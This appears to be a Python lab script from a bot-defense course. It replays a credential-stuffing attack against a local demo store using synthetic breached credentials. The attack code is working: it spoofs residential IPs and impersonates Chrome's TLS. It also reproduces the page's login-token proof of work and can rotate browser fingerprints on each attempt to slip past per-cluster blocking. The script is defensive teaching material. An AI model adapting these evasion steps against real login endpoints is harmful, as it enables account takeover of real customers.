"""
Chapter 9, Round 4 attack: credential stuffing (Section 9.7).

This is a DEFENDER's exercise. It replays the credential-stuffing traffic pattern against your own local
store so you can watch Round 4's layers (token binding, then failures per fingerprint cluster) decide on it.
It is deliberately minimal: it exists to produce the signal the defense reads, not to be a usable stuffer.
Every credential is synthetic lab data (the seeded accounts and a made-up breach list), the "residential"
addresses are rented from data/world.json, and the target is whatever labnet lets through (this machine).

The scalper has stopped farming accounts, because the model catches fresh ones. It steals aged ones: the
breach list pairs 40 real customers with the password they used elsewhere (10 of them reused it here) and 20
addresses that never existed. Each attempt comes from a different "residential" address, so per-IP limits
see nothing.

Modes (each shows a different layer):
    (default)       a bare POST /api/login: no page, no telemetry, no token
    --with-token    the browser-equivalent flow: send a captured fingerprint, mint the login token the way
                    login9.js does (W2 Ch4's lesson: client code is never a secret), then log in
    --rotate-fp     with --with-token, present a NEW fingerprint on every attempt

"succeeded" is a takeover: the store opened a session as the victim.

Expected (60 attempts, 10 takeable accounts):
    level 0 to 4                      ~10 takeovers (every victim who reused a password)
    level 5, default                  0: no valid token
    level 5, --with-token             a few at most, then the whole fingerprint cluster is blocked
    level 5, --with-token --rotate-fp ~10 again: every attempt is its own cluster (the W3 hand-off)

Run:  python attacks/round4_stuffing.py [--with-token] [--rotate-fp] [--limit 60]
"""

import argparse
import copy
import hashlib
import json
import random
import re

from curl_cffi import requests as cffi

from _common import BASE_URL, CLAIM, Cost, bot_ip, rng_for

# The captured fingerprint the stuffer replays. It is a plausible Chrome on Linux that no shopper shares, so
# its cluster belongs to the attacker alone (a stuffer that replays a REAL customer's fingerprint shares that
# customer's cluster: Round 4's debrief).
NONCE = re.compile(r"ShopSensor\.send\(\"([^\"]+)\"\)")


def replay_signals(rotate=False, rng=None):
    from profile_replay import profile
    sig = copy.deepcopy(profile("chromium-153-linux")["signals"])
    sig["hardware_concurrency"] = 6
    sig["geometry"]["screen_w"], sig["geometry"]["screen_h"] = 1600, 900
    if rotate:
        sig["hardware_concurrency"] = rng.choice([2, 3, 4, 6, 8, 10, 12, 16, 20, 24, 32])
        sig["geometry"]["screen_w"] = rng.choice([1366, 1440, 1536, 1600, 1680, 1920, 2048, 2560])
        sig["webgl"]["renderer"] += f" #{rng.getrandbits(16):04x}"
    return sig


def combo_list():
    """email:password lines as a stuffer would buy them: 40 customers, 10 of whom reused the password, plus 20 addresses that never existed."""
    from demo_site.seed import password_for, username
    rng = random.Random("w2-ch9-breach-list")           # fixed: the same list every run, so the checkpoint's numbers are stable
    lines = []
    for n, i in enumerate(range(100, 140)):
        reused = n % 4 == 0
        lines.append((username(i), password_for(i) if reused else f"{rng.choice(['Summer', 'Winter', 'Dragon', 'Hunter'])}{rng.randint(1980, 2009)}!"))
    for _ in range(20):
        lines.append((f"{rng.choice(['alex', 'sam', 'jo', 'kim'])}{rng.randint(100, 999)}@mail.example", f"Pass{rng.randint(1000, 9999)}!"))
    rng.shuffle(lines)
    return lines


def mint_token(s, h, sig):
    """login9.js in Python: report the fingerprint, solve the proof of work bound to it, collect the token."""
    from defenses.token_binding import zero_bits
    r = s.get(BASE_URL + "/", headers=h)
    m = NONCE.search(r.text)
    if not m:
        return ""
    s.post(BASE_URL + "/api/telemetry", headers=h, json={"kind": "sensor", "nonce": m.group(1), "signals": sig})
    c = s.get(BASE_URL + "/api/login/challenge", headers=h).json()
    if "nonce" not in c:
        return ""
    counter = 0
    while zero_bits(hashlib.sha256(f"{c['nonce']}:{c['fp_hash']}:{counter}".encode()).digest()) < c["bits"]:
        counter += 1
    return s.post(BASE_URL + "/api/login/token", headers=h, json={"nonce": c["nonce"], "counter": counter}).json().get("token", "")


def attempt(email, password, with_token, rotate, rng):
    s = cffi.Session(impersonate="chrome150")
    h = {"X-Lab-Client-IP": bot_ip(rng), "X-Lab-Actor": "bot:round4_stuffer", "X-Lab-JA4": CLAIM["chromium"]}
    if with_token:
        h["X-Login-Token"] = mint_token(s, h, replay_signals(rotate, rng))
    r = s.post(BASE_URL + "/api/login", headers=h, json={"email": email, "password": password})
    return {"status": "reserved" if r.status_code == 200 else "blocked" if r.status_code in (403, 429) else "failed",
            "http": r.status_code, "verdict": r.headers.get("X-Lab-Verdict"), "signals": (r.headers.get("X-Lab-Signals") or "").split(",")}


def run(with_token=False, rotate=False, limit=60, verbose=False):
    rng = rng_for("round4")
    combos = combo_list()[:limit]
    results = []
    with Cost() as cost:
        for email, password in combos:
            results.append(attempt(email, password, with_token, rotate, rng))
    return results, cost


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("--with-token", action="store_true", help="reproduce the page's token flow in Python")
    ap.add_argument("--rotate-fp", action="store_true", help="a new fingerprint per attempt")
    ap.add_argument("--limit", type=int, default=60)
    a = ap.parse_args()
    print(f"=== Round 4: credential stuffing (token: {a.with_token}, rotate: {a.rotate_fp}) ===")
    results, cost = run(a.with_token, a.rotate_fp, a.limit)
    name = "round4_stuffing" + ("_token" if a.with_token else "") + ("_rotate" if a.rotate_fp else "")
    out = {"attack": name, "attempted": len(results), "succeeded": sum(r["status"] == "reserved" for r in results),
           "blocked": sum(r["status"] == "blocked" for r in results),
           "wall_s": round(cost.wall_s, 2), "wall_s_per_attempt": round(cost.wall_s / max(1, len(results)), 2)}
    print(json.dumps(out))
